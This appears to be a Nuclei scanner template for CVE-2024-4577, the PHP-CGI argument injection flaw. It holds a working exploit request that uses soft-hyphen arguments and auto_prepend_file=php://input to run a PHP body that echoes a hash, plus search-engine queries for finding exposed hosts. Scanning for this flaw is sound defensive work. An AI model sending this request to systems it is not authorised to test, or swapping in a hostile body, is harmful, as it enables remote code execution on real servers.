http:
- body: '<?php echo md5("CVE-2024-4577"); ?>

    '
  matchers:
  - part: body
    type: word
    words:
    - 3f2ba4ab3b260f4c2dc61a6fac7c3e8a
  method: POST
  path:
  - '{{BaseURL}}/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  - '{{BaseURL}}/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  - '{{BaseURL}}/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  - '{{BaseURL}}/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  stop-at-first-match: true
id: CVE-2024-4577
info:
  author: "H\xFCseyin TINTA\u015E,sw0rk17,s4e-io,pdresearch"
  classification:
    cpe: cpe:2.3:a:php:php:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-4577
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.9996
    epss-score: 0.94374
  description: 'PHP CGI - Argument Injection (CVE-2024-4577) is a critical argument
    injection flaw in PHP.

    '
  impact: 'Successful exploitation could lead to remote code execution on the affected
    system.

    '
  metadata:
    fofa-query: title="php warning" || "fatal error"
    google-query: intitle:"php warning" || "fatal error"
    product: php
    shodan-query:
    - cpe:"cpe:2.3:a:php:php"
    - http.title:"php warning" || "fatal error"
    - php.ini
    - the requested resource <code class="url">
    - x-powered-by:"php"
    vendor: php
    verified: true
  name: PHP CGI - Argument Injection
  reference:
  - https://s4e.io/tools/php-cgi-code-injection-cve-2024-4577
  - http://www.openwall.com/lists/oss-security/2024/06/07/1
  - https://blog.orange.tw/2024/06/cve-2024-4577-yet-another-php-rce.html
  - https://cert.be/en/advisory/warning-php-remote-code-execution-patch-immediately
  remediation: 'Apply the vendor-supplied patches or upgrade to a non-vulnerable version.

    '
  severity: critical
  tags: cve,cve2024,php,cgi,rce,kev,vkev,vuln
